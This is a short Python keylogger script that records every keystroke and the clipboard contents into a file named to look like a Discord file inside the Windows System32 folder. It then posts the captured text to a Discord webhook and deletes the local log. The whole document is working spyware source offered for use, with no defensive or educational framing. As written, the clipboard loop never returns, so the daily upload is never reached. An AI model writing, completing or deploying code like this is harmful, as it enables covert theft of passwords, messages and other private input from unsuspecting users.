import os
import sys
import time
import keyboard
import pyautogui
import requests

# Set the webhook URL for Discord
webhook_url = "YOUR_DISCORD_WEBHOOK_URL"

# Set the path to save the logged keypresses
log_path = "C:\\Windows\\System32\\discord.txt"

# Initialize the keylogger
def keylogger(event):
    with open(log_path, "a") as file:
        file.write(event.name)
        file.write("\n")

# Initialize the clipboard logger
def clipboard_logger():
    while True:
        clipboard_content = pyautogui.paste()

        if clipboard_content != "":
            with open(log_path, "a") as file:
                file.write(clipboard_content)
                file.write("\n")

        time.sleep(1)

# Send the logged keypresses to Discord using the webhook
def send_to_discord():
    with open(log_path, "r") as file:
        content = file.read()

    payload = {
        "content": content
    }

    try:
        response = requests.post(webhook_url, json=payload)
        if response.status_code == 204:
            os.remove(log_path)  # Remove the log file if successfully sent to Discord
    except:
        pass

# Start the keylogger
keyboard.on_release(keylogger)

# Start the clipboard logger
clipboard_logger()

# Schedule sending the logged keypresses to Discord once a day
while True:
    send_to_discord()
    time.sleep(86400)  # 24 hours
